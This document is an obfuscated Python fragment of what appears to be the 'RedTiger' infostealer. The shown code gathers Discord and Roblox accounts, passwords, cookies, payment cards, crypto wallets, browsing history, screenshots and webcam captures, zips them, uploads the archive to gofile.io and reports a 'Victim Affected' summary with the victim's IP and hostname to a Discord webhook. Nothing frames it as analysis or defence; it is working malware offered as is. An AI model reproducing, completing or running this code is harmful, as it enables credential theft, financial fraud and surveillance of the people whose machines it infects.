        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info = f"Error: {e}"

    try: 
        YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT = ILNPQPVPIZKLRCBFQFFSHQNUJGUDLFDHIBRBFQAYXBAHCDPOOU(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT = f"Error: {e}"

    try: 
        DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX, FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD, VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU, UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS, NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT, ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE = BUSAMIABSZBVKTIGXQVLAEDWFNJLQZBZTGOGAXCALUEHYJIKSGFNLTQMYFVZIKMUPB(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX = f"Error: {e}"
        FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD = f"Error: {e}"
        VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU = f"Error: {e}"
        UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS = f"Error: {e}"
        NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT = f"Error: {e}"
        ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE = f"Error: {e}"

    try: 
        XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ = ZSVIRVMOLUKVAAEDMKIBGHXDNTNQCEBQKJHWKTPTWOKLKAYJOGUEVBHOUBWJLTC(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ = f"Error: {e}"

    try: 
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = CWVXPOPHTQOVFZPFJTDIJYCYLNOVKXMAISAPKFSESKYQLBGBIZLMWIMVJXPVLBAFOTRWDKKZS(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = f"Error: {e}"

    try: 
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_screenshot = ULHLKLXIYVMSLQBLRLWBVLMTVMNIKHMZBDWOWUIIHFOOXXWMLVBXWOUMZAVFLJUCKWQTMTHWBAL(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_screenshot = f"Error: {e}"

    try: 
        HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF, QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN, QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK = UWRWVRVIEVCJSSKSVCVTWCRGINPNEHAIRBFWCQBMJDNQSHJTTFDMEZFZWXMJ(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_screenshot = f"Error: {e}"

    try: 
        AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN = UHSLYCXNYLGFBAJHTERZRJUVRARPNLYGSKMATUDPHMCSJCYDVSSZLGQLRAVZ(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
        AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN = f"Error: {e}"

    if PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Discord Injection : {PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN}")

    if AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Camera Capture    : {AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture}")

    if AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_screenshot != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Screenshot        : {AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_screenshot}")

    if AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"System Info       : {AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info}")

    if YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Discord Accounts  : {YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT}")

    if XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Roblox Accounts   : {XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ}")

    if FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Passwords         : {FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD}")

    if VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Cookies           : {VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU}")

    if ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Cards             : {ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE}")

    if UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Browsing History  : {UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS}")

    if NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Download History  : {NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT}")

    if DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Extentions        : {DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX}")

    if HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Wallets           : {HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF}")

    if QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Game Launchers    : {QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN}")
    
    if QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Apps              : {QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK}")
    
    if AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN != None:
        TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP.append(f"Interesting Files : {AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN}")

BZDALHZNWGUPXKVJIXCZFCSANOOSLRGWUEJYXWJWQPMBCBDTUELBFMHGCLFJQAQBMAPNHLSRNKFTSSMJLKFJ.seek(0)

try:
    try: LSVFFBXKLUNUTTTBKNOHPRTFDXMWISELOPHFGMWJFUWSMSINWIMUHMLDVGPCHKDPAH = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: LSVFFBXKLUNUTTTBKNOHPRTFDXMWISELOPHFGMWJFUWSMSINWIMUHMLDVGPCHKDPAH = "store4"

    RIRORKYORBYWCJZPWBSFXRZCDLYEEGTUDTBHKUUDXGJCTJXKXCRLFBMRQXQJQAJMKUINPZZSGKU = requests.post(
        f"https://{LSVFFBXKLUNUTTTBKNOHPRTFDXMWISELOPHFGMWJFUWSMSINWIMUHMLDVGPCHKDPAH}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ.replace(' ', '_')}.zip", BZDALHZNWGUPXKVJIXCZFCSANOOSLRGWUEJYXWJWQPMBCBDTUELBFMHGCLFJQAQBMAPNHLSRNKFTSSMJLKFJ)}
    )

    XLNCXONJFCUSNSJZWKRWIXMJWEVMOLDQYBLLGXFDQTNYEZCDCVLWEQZUHEELAFLZGZIBDIPBXPVBVXGDPNKJLAGVFPHBJXNY = RIRORKYORBYWCJZPWBSFXRZCDLYEEGTUDTBHKUUDXGJCTJXKXCRLFBMRQXQJQAJMKUINPZZSGKU.json()["data"]["downloadPage"]
except Exception as e:
    XLNCXONJFCUSNSJZWKRWIXMJWEVMOLDQYBLLGXFDQTNYEZCDCVLWEQZUHEELAFLZGZIBDIPBXPVBVXGDPNKJLAGVFPHBJXNY = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=TERSYZNSHSJYJYKIBWVSNEGOUYNOLMLHQMXINJLJLWUDKATBGYKKULLSGJZBIIWMSXDT
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {SVALWHBMZPZGKTWIEUUFIYRCLNTPZYYUYTJUURDIKAQGIONLHSPOHGIPRKDZTSEFBIBMXXMTLCMUW}
Username    : {JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ}
DisplayName : {IACEFSHGQARRVESHBISUJLYOIFQSMCOFDHHZEKCHHAJTEZSFIRFWCUFIFAMXRIPJPNYFWBAIZCVGFTBSUSUUPOHQUFQHTED}
Ip Public   : {TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB}
Ip Local    : {IJNJRHWBPXVRYQAVAHZQTJDLXJLTLZDLBGJVYEXGTLKPIFBTHBFPPXRAXDUQ}
Country     : {SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{XLNCXONJFCUSNSJZWKRWIXMJWEVMOLDQYBLLGXFDQTNYEZCDCVLWEQZUHEELAFLZGZIBDIPBXPVBVXGDPNKJLAGVFPHBJXNY}"""
).set_footer(
    text=OYGHCENDOVBGZZPQOHTFAZDNQOCNCUKDCLRKGNEEFNNCFXFZDNVBSHEBDPEVUICBHDTJXBXS, 
    icon_url=BSPTFRPFLBSHSCGICJFUGTCGBYTROBQVURMKJDDNLZTWPTHPWAUWOJRHHAWYIRIXMYLHCCSZ
)

try:  
    TFCVFIUDQLRVSKVBIIJIWFUGHLHBUOUFYLDWAAKBAVQQVBOVKIZIDXIEIUKFMHYBZTHWGYTGGLQNXBOKSKLYRHCFZAWUANS = discord.SyncWebhook.from_url(BSSWBVSVFPQLDWZMFKXDPUIAIHSKDNIXDKPGMIZFWUWDDIPWHANKVTYBFGFVYNRMWNCAR)
    TFCVFIUDQLRVSKVBIIJIWFUGHLHBUOUFYLDWAAKBAVQQVBOVKIZIDXIEIUKFMHYBZTHWGYTGGLQNXBOKSKLYRHCFZAWUANS.send(embed=embed, username=DYCLPVZVUXQZMUOIBAUSSULIRLVZOWGVYADYFCIGSABCFCMCGYZGCQKLGBHTYGHWGEYCLIMBFFYUALNLRIPVNAEDWGUKEEKNN, avatar_url=BSPTFRPFLBSHSCGICJFUGTCGBYTROBQVURMKJDDNLZTWPTHPWAUWOJRHHAWYIRIXMYLHCCSZ)
except: pass


try: threading.Thread(target=JLWDIBNUTQNKBDYSSMYFWUYUZZCEXESGIVTTJNKTQPAJRXHCTPOJJQWMASAUMSVOCQAFTNOWHQCWOUNVLY).start()
except: pass
try: threading.Thread(target=VTPYICQSXMHGTGFJKLIMBYEHCHYIVLHLGOBGBTROJASLJJBFCJOSSOINDWSJMHKTURNEEZVHFUYUBASUTIXVPNTIHNFU).start()
except: pass
try: threading.Thread(target=JAKVUOLDNQAOXHASCRQFVTWAGJPRVALHOCYHCDBSADNIENRUYE).start()
except: pass
try: threading.Thread(target=WFAMBECGBOBELQASEWBRWRVAVTWXUWZYLBSULSCMFLGOWJJHTYIHYDPZYSIFALQTJPFFZVXADNCPVBQKDIJF).start()
except: pass
try: threading.Thread(target=IDLLHGDGLQMOCBATVOJMPFLVWODJWECHYVJATKOWYLRUGYROVBQHMICOUNAJPGXRZKWPFLWEHMS).start()
except: pass
try: threading.Thread(target=XSYLZFNWTJUDFUXRUEXYUPHSRAWFOVSXSTDMAENEVHTEQACEPLEKBPEMANXWZACYOXXIDCTJOJCLJI).start()
except: pass
try: threading.Thread(target=VLNBAJAVVCEVQTGQNQFAKNZISNYWWXVFGCZBNLUIYYLPIHVWDMZPB).start()
except: pass
try: threading.Thread(target=MTCGVPZMQQQYKBLPASOYAGDJJAVLHIVGWMFNBFURIWAZNTTJXEGWHZMK).start()
except: pass
